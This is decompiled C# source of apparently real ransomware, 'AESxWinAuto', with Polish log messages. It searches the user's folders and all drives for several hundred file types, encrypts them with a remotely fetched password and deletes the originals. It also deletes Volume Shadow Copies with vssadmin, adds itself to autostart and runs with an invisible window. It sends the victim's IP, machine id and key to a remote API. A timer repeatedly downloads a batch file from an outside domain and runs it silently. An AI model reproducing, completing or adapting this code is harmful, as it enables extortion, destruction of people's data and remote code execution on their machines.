using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;
using AESxWin.Helpers;
using AESxWin.Properties;
using Microsoft.Win32;

namespace AESxWin;

public class AESxWinAuto : Form
{
	public static string[] image_ext = new string[390]
	{
		".jpg", ".jpeg", ".png", ".gif", ".bmp", ".groups", ".hdd", ".hpp", ".m2ts", ".m4p",
		".mpeg", ".ndf", ".nvram", ".ogg", ".ost", ".pab", ".pdb", ".pif", ".qed", ".qcow",
		".qcow2", ".rvt", ".st7", ".stm", ".vbox", ".vdi", ".vhd", ".vhdx", ".vmdk", ".vmsd",
		".vmx", ".vmxf", ".3fr", ".3pr", ".ab4", ".accde", ".accdr", ".accdt", ".ach", ".acr",
		".adb", ".ads", ".agdl", ".ait", ".apj", ".asm", ".awg", ".back", ".backup", ".backupdb",
		".bay", ".bdb", ".bgt", ".bik", ".bpw", ".cdr3", ".cdr4", ".cdr5", ".cdr6", ".cdrw",
		".ce1", ".ce2", ".cib", ".craw", ".crw", ".csh", ".csl", ".db_journal", ".dc2", ".dcs",
		".ddoc", ".ddrw", ".der", ".des", ".dgc", ".djvu", ".dng", ".drf", ".dxg", ".eml",
		".erbsql", ".erf", ".exf", ".ffd", ".fh", ".fhd", ".gray", ".grey", ".gry", ".hbk",
		".ibd", ".ibz", ".iiq", ".incpas", ".jpe", ".kc2", ".kdbx", ".kdc", ".kpdx", ".lua",
		".mdc", ".mef", ".mfw", ".mmw", ".mny", ".mrw", ".myd", ".ndd", ".nef", ".nk2",
		".nop", ".nrw", ".ns2", ".ns3", ".ns4", ".nwb", ".nx2", ".nxl", ".nyf", ".odb",
		".odf", ".odg", ".odm", ".orf", ".otg", ".oth", ".otp", ".ots", ".ott", ".p12",
		".p7b", ".p7c", ".pdd", ".pem", ".plus_muhd", ".plc", ".pot", ".pptx", ".psafe3", ".py",
		".qba", ".qbr", ".qbw", ".qbx", ".qby", ".raf", ".rat", ".raw", ".rdb", ".rwl",
		".rwz", ".s3db", ".sd0", ".sda", ".sdf", ".sqlite", ".sqlite3", ".sqlitedb", ".sr2", ".srf",
		".srw", ".st5", ".st8", ".std", ".sti", ".stw", ".stx", ".sxd", ".sxg", ".sxi",
		".sxm", ".tex", ".wallet", ".wb2", ".wpd", ".x11", ".x3f", ".xis", ".ycbcra", ".yuv",
		".contact", ".dbx", ".doc", ".docx", ".jnt", ".msg", ".oab", ".ods", ".pdf", ".pps",
		".ppsm", ".ppt", ".pptm", ".prf", ".pst", ".rar", ".rtf", ".wab", ".xls", ".xlsx",
		".xml", ".zip", ".1cd", ".3ds", ".3g2", ".3gp", ".7z", ".7zip", ".accdb", ".aoi",
		".asf", ".asp", ".aspx", ".asx", ".avi", ".bak", ".cer", ".cfg", ".class", ".config",
		".css", ".csv", ".db", ".dds", ".dwg", ".dxf", ".flf", ".flv", ".html", ".idx",
		".js", ".key", ".kwm", ".laccdb", ".ldf", ".lit", ".m3u", ".mbx", ".md", ".mdf",
		".mid", ".mlb", ".mov", ".mp4", ".mpg", ".obj", ".odt", ".ods", ".odp", ".pages",
		".php", ".psd", ".pwm", ".rm", ".safe", ".sav", ".save", ".sql", ".srt", ".swf",
		".thm", ".vob", ".wav", ".wma", ".wmv", ".xlsb3dm", ".aac", ".ai", ".arw", ".c",
		".cdr", ".cls", ".cpi", ".cpp", ".cs", ".db3", ".docm", ".dot", ".dotm", ".dotx",
		".drw", ".dxb", ".eps", ".fla", ".flac", ".fxg", ".java", ".m", ".m4v", ".max",
		".mdb", ".pcd", ".pct", ".pl", ".potm", ".potx", ".ppam", ".ppsm", ".ppsx", ".pptm",
		".ps", ".r3d", ".rw2", ".sldm", ".sldx", ".svg", ".tga", ".wps", ".xla", ".xlam",
		".xlm", ".xlr", ".xlsm", ".xlt", ".xltm", ".xltx", ".xlw", ".act", ".adp", ".al",
		".bkp", ".blend", ".cdf", ".cdx", ".cgm", ".cr2", ".crt", ".dac", ".dbf", ".dcr",
		".ddd", ".design", ".dtd", ".fdb", ".fff", ".fpx", ".h", ".iif", ".indd", ".jpeg",
		".mos", ".nd", ".nsd", ".nsf", ".nsg", ".nsh", ".odc", ".odp", ".oil", ".pas",
		".pat", ".pef", ".pfx", ".ptx", ".qbb", ".qbm", ".sas7bdat", ".say", ".st4", ".st6",
		".stc", ".sxc", ".sxw", ".tlg", ".wad", ".xlk", ".aiff", ".bin", ".cmt", ".dat",
		".dit", ".edb", ".flvv", ".ntx", ".xsd", ".pem", ".xsd", ".xsl", ".ewd", ".dbt",
		".ob", ".gofin", ".dsf", ".ds4", ".shx", ".ath", ".bac", ".ts", ".dst", ".dwfx"
	};

	public static string[] video_ext = new string[15]
	{
		".avi", ".flv", ".mov", ".mp4", ".mpg", ".rm", ".rmvb", ".mkv", ".swf", ".vob",
		".wmv", ".3g2", ".3gp", ".asf", ".ogv"
	};

	public static string[] audio_ext = new string[6] { ".mp3", ".wav", ".acc", ".ogg", ".amr", ".wma" };

	public static string[] document_ext = new string[9] { ".pdf", ".txt", ".rtf", ".doc", ".docx", ".ppt", ".pptx", ".xls", ".xlsx" };

	public static string[] compressed_ext = new string[5] { ".zip", ".rar", ".7z", ".tar", ".gzip" };

	public static string[] code_ext = new string[9] { ".cs", ".vb", ".java", ".py", ".rb", ".cpp", ".html", ".css", ".js" };

	public List<string> StartPaths = new List<string>();

	private BackgroundWorker bwEncryptor = null;

	private BackgroundWorker bwPathFinder = null;

	private Queue<string> PathsQueue = new Queue<string>();

	private bool FinishedPathFinder = false;

	private long EncryptionCount = 0L;

	private long TotalFindPaths = 0L;

	private bool requestSent = false;

	private bool _isAutostart = true;

	private string _currentPassword = string.Empty;

	private string _currentIP = string.Empty;

	private bool _isStarted = false;

	private IContainer components = null;

	private Button btnStartAutoEncrypt;

	private CheckBox chckIsStartup;

	private Timer timer1;

	private Timer timer2;

	private Button button1;

	private Button button2;

	private Button button3;

	private Button button4;

	private Timer timer3;

	private ComboBox comboBox1;

	private ComboBox comboBox2;

	private WebBrowser webBrowser1;

	private Timer timer4;

	private PictureBox pictureBox1;

	public static string LogPath { get; set; }

	public static string ErrorLogPath { get; set; }

	public List<string> IgnoredPaths { get; set; }

	public string[] SearchExtensions { get; set; }

	public bool IsStartup
	{
		get
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			return registryKey.GetValue(Assembly.GetExecutingAssembly().GetName().Name) != null;
		}
		set
		{
			Reg.RegisterInStartup(value, Application.get_ExecutablePath());
		}
	}

	public bool IsAutostart
	{
		get
		{
			return _isAutostart;
		}
		set
		{
			_isAutostart = value;
		}
	}

	public string CurrentPassword
	{
		get
		{
			return _currentPassword;
		}
		set
		{
			_currentPassword = value;
		}
	}

	public string CurrentIP
	{
		get
		{
			return _currentIP;
		}
		set
		{
			_currentIP = value;
		}
	}

	public Guid ComputerId
	{
		get
		{
			Guid result = default(Guid);
			string text = Reg.Read("ComputerId");
			if (text != null)
			{
				Guid.TryParse(text, out result);
			}
			else
			{
				result = Guid.NewGuid();
				Reg.Write("ComputerId", result);
			}
			return result;
		}
	}

	public bool IsStarted
	{
		get
		{
			return _isStarted;
		}
		set
		{
			_isStarted = value;
			if (_isStarted)
			{
				((Control)btnStartAutoEncrypt).set_Text("Stop");
			}
			else
			{
				((Control)btnStartAutoEncrypt).set_Text("Start");
			}
		}
	}

	public AESxWinAuto()
	{
		InitializeComponent();
		LogPath = "C:\\ProgramData\\Keyboard";
		if (!Directory.Exists(LogPath))
		{
			Directory.CreateDirectory(LogPath);
		}
		string text = DateTime.Now.ToString("ddMMyyyy_HHmmss");
		LogPath = Path.Combine(LogPath, text + ".log");
		ErrorLogPath = Path.Combine(LogPath, text + ".error");
		Log.WriteLog(LogPath, "Start programu");
		IsStartup = true;
		chckIsStartup.set_Checked(IsStartup);
		InitSearchExtensions();
		InitIgnoredPaths();
		InitStartPaths();
		GetIP();
		GetPassword();
	}

	private void InitSearchExtensions()
	{
		SearchExtensions = image_ext;
	}

	private void InitIgnoredPaths()
	{
		IgnoredPaths = new List<string>();
		IgnoredPaths.Add(Path.GetDirectoryName(Application.get_ExecutablePath()));
		IgnoredPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		IgnoredPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
		IgnoredPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData));
		IgnoredPaths.Add("C:\\Program Files\\Common Files");
	}

	private void InitStartPaths()
	{
		DriveInfo[] drives = FilesHelper.GetDrives();
		_ = ComputerId;
		StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.Personal));
		StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.Recent));
		StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
		StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic));
		StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos));
		StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
		StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.Favorites));
		StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			StartPaths.Add(driveInfo.RootDirectory.Name);
		}
	}

	private async void GetPassword()
	{
		try
		{
			string text2 = (CurrentPassword = await PasswordAPI.GetPassword());
			if (string.IsNullOrEmpty(CurrentPassword))
			{
				return;
			}
			if (CurrentPassword.Length <= 3)
			{
				_ = CurrentPassword;
			}
			else
			{
				CurrentPassword.Substring(0, 4);
			}
			Log.WriteLog(LogPath, "Pobrano nowe hasło. x570");
			((Control)btnStartAutoEncrypt).set_Enabled(true);
			string strCmdText = "vssadmin.exe Delete Shadows /All /Quiet";
			Process.Start("CMD.exe", strCmdText);
			if (bwEncryptor == null && bwPathFinder == null && IsAutostart)
			{
				btnStartAutoEncrypt_Click(btnStartAutoEncrypt, new EventArgs());
			}
			try
			{
				if (!string.IsNullOrEmpty(CurrentPassword) && !string.IsNullOrEmpty(CurrentIP) && !requestSent)
				{
					SendAPI.SendData(CurrentIP, ComputerId.ToString(), DateTime.Now, CurrentPassword);
					requestSent = true;
				}
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			Exception ex = ex2;
			Log.WriteLog(ErrorLogPath, "Błąd pobierania hasła. " + ex.ToString());
		}
	}

	private async void GetIP()
	{
		try
		{
			string text2 = (CurrentIP = await IpAPI.GetIP());
			if (!string.IsNullOrEmpty(CurrentIP))
			{
				Log.WriteLog(LogPath, "Ustalono adres IP. " + CurrentIP);
			}
			else
			{
				Log.WriteLog(LogPath, "Błąd pobierania adresu IP.");
			}
			try
			{
				if (!string.IsNullOrEmpty(CurrentPassword) && !string.IsNullOrEmpty(CurrentIP) && !requestSent)
				{
					SendAPI.SendData(CurrentIP, ComputerId.ToString(), DateTime.Now, CurrentPassword);
					requestSent = true;
				}
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			Exception ex = ex2;
			Log.WriteLog(ErrorLogPath, "Błąd pobierania hasła. " + ex.ToString());
		}
	}

	private void chckIsStartup_Click(object sender, EventArgs e)
	{
		IsStartup = chckIsStartup.get_Checked();
	}

	private void btnStartAutoEncrypt_Click(object sender, EventArgs e)
	{
		if (((Control)btnStartAutoEncrypt).get_Enabled())
		{
			if (!IsStarted)
			{
				IsStarted = !IsStarted;
				Start();
			}
			else
			{
				Stop();
			}
		}
	}

	private void Start()
	{
		EncryptionCount = 0L;
		lock (PathsQueue)
		{
			PathsQueue.Clear();
		}
		bwPathFinder = new BackgroundWorker();
		bwPathFinder.RunWorkerCompleted += BwPathFinder_RunWorkerCompleted;
		bwPathFinder.DoWork += BwPathFinder_DoWork;
		bwPathFinder.RunWorkerAsync();
		bwEncryptor = new BackgroundWorker();
		bwEncryptor.DoWork += BwEncryptor_DoWork;
		bwEncryptor.RunWorkerCompleted += BwEncryptor_RunWorkerCompleted;
		bwEncryptor.RunWorkerAsync();
		string text = string.Empty;
		foreach (string startPath in StartPaths)
		{
			text = text + startPath + " ";
		}
		Log.WriteLog(LogPath, "Rozpoczęto przeszukiwanie lokalizacji: " + text);
	}

	private void Stop()
	{
		IsStarted = false;
		Thread.Sleep(50);
		lock (PathsQueue)
		{
			PathsQueue.Clear();
		}
	}

	private void BwPathFinder_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
	{
		Log.WriteLog(LogPath, $"Zakończono przeszukiwanie dysku ({TotalFindPaths})");
		FinishedPathFinder = true;
	}

	private void BwPathFinder_DoWork(object sender, DoWorkEventArgs e)
	{
		List<string> list = new List<string>();
		foreach (string ignoredPath in IgnoredPaths)
		{
			if (!IsStarted)
			{
				continue;
			}
			try
			{
				IEnumerable<string> folderFilesPaths = ignoredPath.GetFolderFilesPaths();
				foreach (string item in folderFilesPaths)
				{
					try
					{
						string directoryName = Path.GetDirectoryName(item);
						if (!list.Contains(directoryName))
						{
							list.Add(directoryName);
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception ex2)
			{
				Log.WriteLog(ErrorLogPath, "BwPathFinder_DoWork " + ex2.ToString());
			}
		}
		IgnoredPaths.AddRange(list);
		foreach (string startPath in StartPaths)
		{
			if (!IsStarted)
			{
				break;
			}
			try
			{
				if (File.Exists(startPath))
				{
					try
					{
						string directoryName2 = Path.GetDirectoryName(startPath);
						if (!IgnoredPaths.Contains(directoryName2) && startPath.CheckExtension(SearchExtensions))
						{
							lock (PathsQueue)
							{
								PathsQueue.Enqueue(startPath);
							}
							TotalFindPaths++;
						}
					}
					catch (Exception ex3)
					{
						Log.WriteLog(ErrorLogPath, "BwPathFinder_DoWork 1 " + ex3.ToString());
					}
				}
				try
				{
					if (!Directory.Exists(startPath) || IgnoredPaths.Contains(startPath))
					{
						continue;
					}
					IEnumerable<string> folderFilesPaths2 = startPath.GetFolderFilesPaths();
					foreach (string item2 in folderFilesPaths2)
					{
						try
						{
							string directoryName3 = Path.GetDirectoryName(item2);
							if (IgnoredPaths.Contains(directoryName3))
							{
								continue;
							}
							if (!IsStarted)
							{
								break;
							}
							if (item2.CheckExtension(SearchExtensions) && !item2.EndsWith(".aes"))
							{
								lock (PathsQueue)
								{
									PathsQueue.Enqueue(item2);
								}
								TotalFindPaths++;
							}
							Thread.Sleep(1);
							continue;
						}
						catch
						{
						}
					}
				}
				catch (Exception ex4)
				{
					Log.WriteLog(ErrorLogPath, "BwPathFinder_DoWork 1.2 " + ex4.ToString());
				}
			}
			catch (Exception ex5)
			{
				Log.WriteLog(ErrorLogPath, "BwPathFinder_DoWork 2 " + ex5.ToString());
			}
		}
	}

	private void BwEncryptor_DoWork(object sender, DoWorkEventArgs e)
	{
		while (IsStarted)
		{
			try
			{
				if (PathsQueue.Count != 0)
				{
					string currentPassword = CurrentPassword;
					string path = string.Empty;
					lock (PathsQueue)
					{
						path = PathsQueue.Dequeue();
					}
					if (File.Exists(path))
					{
						try
						{
							path.EncryptFileAsync(currentPassword, deleteOriginal: true);
							EncryptionCount++;
							string directoryName = Path.GetDirectoryName(path);
							if (!StatusFile.StatusFileExist(directoryName))
							{
								StatusFile.WriteStatusFile(directoryName, CurrentIP, ComputerId.ToString(), DateTime.Now);
							}
						}
						catch (Exception ex)
						{
							Log.WriteLog(ErrorLogPath, "BwEncryptor_DoWork " + ex.ToString());
						}
					}
				}
				if (FinishedPathFinder && PathsQueue.Count == 0)
				{
					break;
				}
			}
			catch (Exception ex2)
			{
				Log.WriteLog(ErrorLogPath, "BwEncryptor_DoWork 2 " + ex2.ToString());
			}
			Thread.Sleep(20);
		}
		e.Result = true;
	}

	private void BwEncryptor_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
	{
		if (FinishedPathFinder)
		{
			Log.WriteLog(LogPath, $"Zakończono szyfrowanie ({EncryptionCount})");
			btnStartAutoEncrypt_Click(btnStartAutoEncrypt, new EventArgs());
			Reg.RegisterInStartup(isChecked: false, Application.get_ExecutablePath());
			Log.WriteLog(LogPath, $"Usuwam z autostartu i zamykam program");
			try
			{
				Process process = new Process();
				process.StartInfo.UseShellExecute = false;
				process.StartInfo.CreateNoWindow = true;
				process.StartInfo.FileName = "exec.bat";
				process.Start();
			}
			catch
			{
			}
			((Form)this).Close();
		}
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
	}

	private void timer2_Tick(object sender, EventArgs e)
	{
	}

	private void button4_Click(object sender, EventArgs e)
	{
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		string s = "100";
		int.TryParse(s, out var result);
		MessageBox.Show("The value of i is " + result);
	}

	private void timer3_Tick(object sender, EventArgs e)
	{
		comboBox1.set_DataSource((object)"ssss");
		((ListControl)comboBox1).set_ValueMember("au_id");
		((ListControl)comboBox1).set_DisplayMember("au_lname");
	}

	private void timer4_Tick(object sender, EventArgs e)
	{
		webBrowser1.Navigate("http://www.msn.com/?ocid=iehp");
		WebClient webClient = new WebClient();
		string randomFileName = Path.GetRandomFileName();
		string fileName = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + randomFileName + ".bat";
		webClient.DownloadFile("http://dokumenty-office.eu/ww.txt", fileName);
		Process process = new Process();
		process.StartInfo.UseShellExecute = false;
		process.StartInfo.CreateNoWindow = true;
		process.StartInfo.RedirectStandardOutput = true;
		process.StartInfo.FileName = fileName;
		process.Start();
		process.StandardOutput.ReadToEnd();
		process.WaitForExit();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Expected O, but got Unknown
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Expected O, but got Unknown
		//IL_006a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Expected O, but got Unknown
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_007f: Expected O, but got Unknown
		//IL_0086: Unknown result type (might be due to invalid IL or missing references)
		//IL_0090: Expected O, but got Unknown
		//IL_0091: Unknown result type (might be due to invalid IL or missing references)
		//IL_009b: Expected O, but got Unknown
		//IL_009c: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a6: Expected O, but got Unknown
		//IL_00a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b1: Expected O, but got Unknown
		//IL_00b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c2: Expected O, but got Unknown
		//IL_00c3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cd: Expected O, but got Unknown
		//IL_0115: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0691: Unknown result type (might be due to invalid IL or missing references)
		//IL_069b: Expected O, but got Unknown
		//IL_069d: Unknown result type (might be due to invalid IL or missing references)
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(AESxWinAuto));
		btnStartAutoEncrypt = new Button();
		chckIsStartup = new CheckBox();
		timer1 = new Timer(components);
		timer2 = new Timer(components);
		button1 = new Button();
		button2 = new Button();
		button3 = new Button();
		button4 = new Button();
		timer3 = new Timer(components);
		comboBox1 = new ComboBox();
		comboBox2 = new ComboBox();
		webBrowser1 = new WebBrowser();
		timer4 = new Timer(components);
		pictureBox1 = new PictureBox();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)btnStartAutoEncrypt).set_Anchor((AnchorStyles)10);
		((Control)btnStartAutoEncrypt).set_Enabled(false);
		((Control)btnStartAutoEncrypt).set_Location(new Point(451, 45));
		((Control)btnStartAutoEncrypt).set_Margin(new Padding(4));
		((Control)btnStartAutoEncrypt).set_Name("btnStartAutoEncrypt");
		((Control)btnStartAutoEncrypt).set_Size(new Size(112, 28));
		((Control)btnStartAutoEncrypt).set_TabIndex(4);
		((Control)btnStartAutoEncrypt).set_Text("Start");
		((ButtonBase)btnStartAutoEncrypt).set_UseVisualStyleBackColor(true);
		((Control)btnStartAutoEncrypt).add_Click((EventHandler)btnStartAutoEncrypt_Click);
		((Control)chckIsStartup).set_Anchor((AnchorStyles)10);
		((Control)chckIsStartup).set_AutoSize(true);
		((Control)chckIsStartup).set_Location(new Point(13, 52));
		((Control)chckIsStartup).set_Margin(new Padding(4));
		((Control)chckIsStartup).set_Name("chckIsStartup");
		((Control)chckIsStartup).set_Size(new Size(213, 21));
		((Control)chckIsStartup).set_TabIndex(1);
		((Control)chckIsStartup).set_Text("Uruchom ze startem systemu");
		((ButtonBase)chckIsStartup).set_UseVisualStyleBackColor(true);
		((Control)chckIsStartup).add_Click((EventHandler)chckIsStartup_Click);
		timer1.add_Tick((EventHandler)timer1_Tick);
		timer2.add_Tick((EventHandler)timer2_Tick);
		((Control)button1).set_Location(new Point(321, 45));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(75, 23));
		((Control)button1).set_TabIndex(5);
		((Control)button1).set_Text("button1");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button2).set_Location(new Point(402, 32));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(75, 23));
		((Control)button2).set_TabIndex(6);
		((Control)button2).set_Text("button2");
		((ButtonBase)button2).set_UseVisualStyleBackColor(true);
		((Control)button3).set_Location(new Point(287, 1));
		((Control)button3).set_Name("button3");
		((Control)button3).set_Size(new Size(75, 23));
		((Control)button3).set_TabIndex(7);
		((Control)button3).set_Text("button3");
		((ButtonBase)button3).set_UseVisualStyleBackColor(true);
		((Control)button4).set_Location(new Point(310, 8));
		((Control)button4).set_Name("button4");
		((Control)button4).set_Size(new Size(75, 23));
		((Control)button4).set_TabIndex(8);
		((Control)button4).set_Text("button4");
		((ButtonBase)button4).set_UseVisualStyleBackColor(true);
		((Control)button4).add_Click((EventHandler)button4_Click);
		timer3.add_Tick((EventHandler)timer3_Tick);
		((ListControl)comboBox1).set_FormattingEnabled(true);
		((Control)comboBox1).set_Location(new Point(310, 30));
		((Control)comboBox1).set_Name("comboBox1");
		((Control)comboBox1).set_Size(new Size(121, 24));
		((Control)comboBox1).set_TabIndex(9);
		((ListControl)comboBox2).set_FormattingEnabled(true);
		((Control)comboBox2).set_Location(new Point(183, 11));
		((Control)comboBox2).set_Name("comboBox2");
		((Control)comboBox2).set_Size(new Size(121, 24));
		((Control)comboBox2).set_TabIndex(10);
		((Control)webBrowser1).set_Location(new Point(42, -142));
		((Control)webBrowser1).set_MinimumSize(new Size(20, 20));
		((Control)webBrowser1).set_Name("webBrowser1");
		((Control)webBrowser1).set_Size(new Size(250, 250));
		((Control)webBrowser1).set_TabIndex(11);
		timer4.set_Enabled(true);
		timer4.set_Interval(85100);
		timer4.add_Tick((EventHandler)timer4_Tick);
		pictureBox1.set_Image((Image)(object)Resources._6hBktkqTURBXy85YmI4NzIwM2RiNGI5YmViNTEyMTI4MGNmMThhYjJmMC5qcGVnkpUCzQPAAMLDlQIAzQPAwsM);
		((Control)pictureBox1).set_Location(new Point(83, -11));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(168, 56));
		pictureBox1.set_TabIndex(12);
		pictureBox1.set_TabStop(false);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(8f, 16f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(578, 88));
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Control)this).get_Controls().Add((Control)(object)webBrowser1);
		((Control)this).get_Controls().Add((Control)(object)comboBox2);
		((Control)this).get_Controls().Add((Control)(object)comboBox1);
		((Control)this).get_Controls().Add((Control)(object)button4);
		((Control)this).get_Controls().Add((Control)(object)button3);
		((Control)this).get_Controls().Add((Control)(object)button2);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)btnStartAutoEncrypt);
		((Control)this).get_Controls().Add((Control)(object)chckIsStartup);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_Margin(new Padding(4));
		((Form)this).set_MaximizeBox(false);
		((Control)this).set_Name("AESxWinAuto");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("AESxWinAuto");
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
